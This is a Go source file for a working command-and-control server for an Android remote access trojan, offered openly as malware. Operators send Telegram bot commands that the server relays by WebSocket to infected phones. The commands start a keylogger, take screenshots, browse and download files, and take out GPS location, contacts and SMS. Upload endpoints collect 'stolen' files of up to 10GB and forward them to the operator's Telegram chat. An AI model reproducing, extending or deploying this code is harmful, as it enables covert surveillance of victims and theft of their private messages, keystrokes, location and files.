package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token     = os.Getenv("TELEGRAM_TOKEN")
	chatIDStr = os.Getenv("CHAT_ID")
	clients   = make(map[*websocket.Conn]string) // conn -> device_name
	deviceMu  = sync.RWMutex{}
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

var chatID int64

// File assembly state: file_id -> {total_parts, received_parts map[int][]byte, buf *bytes.Buffer}
type fileState struct {
	totalParts int
	received   map[int][]byte
	buffer     *bytes.Buffer
	mu         sync.Mutex
}
var fileStates = make(map[string]*fileState)
var fileMu = sync.RWMutex{}

// Max file size 10GB
const maxFileSize = 10 * 1024 * 1024 * 1024 // 10GB
const maxPartSize = 50 * 1024 * 1024        // 50MB per Telegram doc
const chunkSize = 1 * 1024 * 1024           // 1MB WS chunks for large data

func main() {
	// Parse chatID once
	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("Invalid CHAT_ID:", err)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// Cleanup file states on shutdown
	go func() {
		<-ctx.Done()
		fileMu.Lock()
		for id := range fileStates {
			delete(fileStates, id)
		}
		fileMu.Unlock()
	}()

	// Start Telegram bot
	go startBot(ctx)

	// HTTP + WebSocket
	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)           // Single files <50MB
	http.HandleFunc("/upload_chunked", chunkedHandler) // Chunked large files or data
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 live → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startBot(ctx context.Context) {
	b, err := bot.New(token)
	if err != nil {
		log.Fatal("Bot init failed:", err)
	}

	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(ctx context.Context, b *bot.Bot, update *models.Update) {
		if update.Message == nil || update.Message.Chat.ID != chatID {
			return
		}
		msg := strings.ToLower(strings.TrimSpace(update.Message.Text))
		parts := strings.Fields(msg)

		if len(parts) == 0 {
			return
		}

		cmd := parts[0]
		args := strings.Join(parts[1:], " ")

		switch cmd {
		case "/start":
			listDevices(b, ctx)
		case "/start_keylog":
			broadcastAll("start_keylog")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog start command sent to all devices."})
		case "/stop_keylog":
			broadcastAll("stop_keylog")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylog stop command sent to all devices."})
		case "/screenshot":
			broadcastAll("screenshot")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot command sent to all devices."})
		case "/send_file", "/download":
			// /send_file or /download /path
			path := args
			if path == "" {
				path = "/sdcard/Download/" // Default
			}
			broadcastAll(fmt.Sprintf("download %s", path))
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("File download triggered for: %s", path)})
		case "/ls", "/list":
			// /ls /path
			path := args
			if path == "" {
				path = "/"
			}
			broadcastAll(fmt.Sprintf("ls %s", path))
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Directory listing triggered for: %s", path)})
		case "/cd":
			// /cd /new/path - Broadcast to set current dir
			if args == "" {
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /cd /path/to/dir"})
				return
			}
			broadcastAll(fmt.Sprintf("cd %s", args))
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Changed directory to: %s", args)})
		case "/location":
			broadcastAll("location")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Location request sent to all devices."})
		case "/contacts":
			broadcastAll("contacts")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Contacts exfil triggered on all devices."})
		case "/sms":
			broadcastAll("sms")
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "SMS exfil triggered on all devices."})
		case "/cat", "/view":
			// /cat /path/to/file - For small text files
			if args == "" {
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /cat /path/to/file"})
				return
			}
			broadcastAll(fmt.Sprintf("cat %s", args))
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("File content request for: %s", args)})
		case "/help":
			helpText := `Available commands:
/start - List devices and root dir
/start_keylog / stop_keylog - Toggle keylogger
/screenshot - Capture screen
/download /send_file <path> - Exfil file/dir (supports up to 10GB, auto-chunks)
/ls /list <path> - List directory
/cd <path> - Change working dir on device
/location - Get GPS
/contacts - Exfil contacts
/sms - Exfil SMS
/cat /view <path> - View text file content
/help - This menu`
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: helpText})
		default:
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown command. Type /help for options."})
		}
	})

	b.Start(ctx)
}

func listDevices(b *bot.Bot, ctx context.Context) {
	deviceMu.RLock()
	devices := make([]string, 0, len(clients))
	for _, dev := range clients {
		devices = append(devices, dev)
	}
	deviceMu.RUnlock()

	if len(devices) == 0 {
		b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "No devices connected. Waiting for RAT..."})
		return
	}

	// For multi-device, list; here assume single but show tree root
	rootTree := `Wybierz urządzenie:
/storage/emulated/0
├─ Android
├─ Download
├─ Music
├─ Podcasts
├─ Ringtones
├─ Alarms
├─ Notifications
├─ Pictures
└─ Movies`
	b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: rootTree})
	// In real multi, add inline keyboard for selection
}

func broadcastAll(cmd string) {
	deviceMu.RLock()
	defer deviceMu.RUnlock()
	log.Printf("Broadcasting command: %s to %d clients", cmd, len(clients))
	for conn := range clients {
		if err := conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
			log.Printf("Failed to send to client: %v", err)
			delete(clients, conn)
		}
	}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP GET / from %s - Health check", r.RemoteAddr)
	json.NewEncoder(w).Encode(map[string]any{
		"base_url":          r.Host,
		"connected_devices": len(clients),
		"status":            "running",
	})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP POST /upload from %s - Single file receive", r.RemoteAddr)
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}
	r.ParseMultipartForm(50 << 20) // 50MB max
	file, header, err := r.FormFile("file")
	if err != nil {
		log.Printf("Error parsing form file: %v", err)
		http.Error(w, "No file in request", 400)
		return
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil || int64(len(data)) > maxFileSize {
		log.Printf("Error reading file or too large: %v", err)
		http.Error(w, "Failed to read file or too large", 500)
		return
	}
	msg := fmt.Sprintf("Stolen file: %s (%dB)", header.Filename, len(data))
	log.Println(msg)
	sendFileToTelegram(header.Filename, data, msg)
	w.Write([]byte("OK"))
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP POST /upload_chunked from %s", r.RemoteAddr)
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}

	fileID := r.URL.Query().Get("file_id")
	if fileID == "" {
		// Legacy chunked data (e.g., keylog, CSV) - treat as text
		defer r.Body.Close()
		data, err := io.ReadAll(r.Body)
		if err != nil {
			log.Printf("Error reading body: %v", err)
			http.Error(w, "Failed to read body", 500)
			return
		}
		msg := fmt.Sprintf("Chunked data: %dB (preview: %s)", len(data), string(data[:min(50, len(data))]))
		log.Println(msg)
		sendMsg(msg)
		w.Write([]byte("OK"))
		return
	}

	// Large file chunk: ?file_id=uuid&part=1&total=200
	partStr := r.URL.Query().Get("part")
	totalStr := r.URL.Query().Get("total")
	part, _ := strconv.Atoi(partStr)
	total, _ := strconv.Atoi(totalStr)

	if part <= 0 || total <= 0 {
		http.Error(w, "Invalid part/total", 400)
		return
	}

	defer r.Body.Close()
	data, err := io.ReadAll(r.Body)
	if err != nil || len(data) > maxPartSize {
		log.Printf("Error reading chunk or too large: %v", err)
		http.Error(w, "Failed to read chunk", 500)
		return
	}

	fileMu.Lock()
	state, exists := fileStates[fileID]
	if !exists {
		state = &fileState{
			totalParts: total,
			received:   make(map[int][]byte),
			buffer:     new(bytes.Buffer),
		}
		fileStates[fileID] = state
	}
	state.mu.Lock()
	state.received[part] = data
	state.mu.Unlock()

	// Check if complete
	complete := true
	for i := 1; i <= total; i++ {
		if _, ok := state.received[i]; !ok {
			complete = false
			break
		}
	}

	if complete {
		// Assemble
		for i := 1; i <= total; i++ {
			state.mu.Lock()
			state.buffer.Write(state.received[i])
			state.mu.Unlock()
		}
		fullData := state.buffer.Bytes()
		if int64(len(fullData)) > maxFileSize {
			log.Printf("Assembled file too large: %dB", len(fullData))
			delete(fileStates, fileID)
			http.Error(w, "File too large", 413)
			return
		}

		fname := r.URL.Query().Get("filename")
		if fname == "" {
			fname = fmt.Sprintf("exfil_%s", fileID[:8])
		}
		msg := fmt.Sprintf("Stolen large file: %s (%dB, %d parts)", fname, len(fullData), total)
		log.Println(msg)
		sendFileToTelegram(fname, fullData, msg)
		delete(fileStates, fileID)
	} else {
		log.Printf("Received chunk %d/%d for %s", part, total, fileID)
	}

	fileMu.Unlock()
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("WS connect attempt from %s", r.RemoteAddr)
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WS upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// Wait for device ID on connect
	_, deviceMsg, err := conn.ReadMessage()
	if err != nil {
		return
	}
	deviceName := string(deviceMsg)
	if !strings.HasPrefix(deviceName, "device:") {
		deviceName = "Unknown Device"
	} else {
		deviceName = deviceName[8:]
	}
	log.Printf("RAT connected: %s", deviceName)

	deviceMu.Lock()
	clients[conn] = deviceName
	deviceMu.Unlock()

	// Cleanup on disconnect
	defer func() {
		deviceMu.Lock()
		delete(clients, conn)
		deviceMu.Unlock()
		log.Printf("RAT disconnected: %s", deviceName)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("WS read error: %v", err)
			break
		}
		incoming := string(msg)
		log.Printf("RAT → %s: %s", deviceName, incoming)

		// Handle responses: dir lists, text data, etc.
		if strings.HasPrefix(incoming, "ls:") || strings.HasPrefix(incoming, "cat:") {
			sendMsg(fmt.Sprintf("[%s] %s", deviceName, incoming))
		} else if strings.HasPrefix(incoming, "data:") {
			// Generic data chunk
			sendMsg(incoming)
		} else {
			sendMsg(fmt.Sprintf("[%s] %s", deviceName, incoming))
		}
	}
}

func sendFileToTelegram(filename string, data []byte, caption string) {
	b, err := bot.New(token)
	if err != nil {
		log.Printf("Failed to init bot: %v", err)
		return
	}

	if len(data) <= maxPartSize {
		// Single part
		_, err = b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFile{FileName: filename, Bytes: data},
			Caption:  caption,
		})
		if err != nil {
			log.Printf("Failed to send file: %v", err)
			sendMsg(caption + " (send failed)")
		} else {
			log.Println("File sent to Telegram")
		}
		return
	}

	// Split large file
	numParts := int(math.Ceil(float64(len(data)) / float64(maxPartSize)))
	for i := 0; i < numParts; i++ {
		start := i * maxPartSize
		end := start + maxPartSize
		if end > len(data) {
			end = len(data)
		}
		partData := data[start:end]
		partName := fmt.Sprintf("%s.part%dof%d", filename, i+1, numParts)

		_, err = b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFile{FileName: partName, Bytes: partData},
			Caption:  fmt.Sprintf("%s\nPart %d/%d (%dB)", caption, i+1, numParts, len(partData)),
		})
		if err != nil {
			log.Printf("Failed to send part %d: %v", i+1, err)
		}
		time.Sleep(100 * time.Millisecond) // Rate limit
	}
	log.Println("Large file split and sent")
}

func sendMsg(text string) {
	b, _ := bot.New(token)
	b.SendMessage(context.Background(), &bot.SendMessageParams{
		ChatID: chatID,
		Text:   text,
	})
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Generate file ID
func genFileID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)
}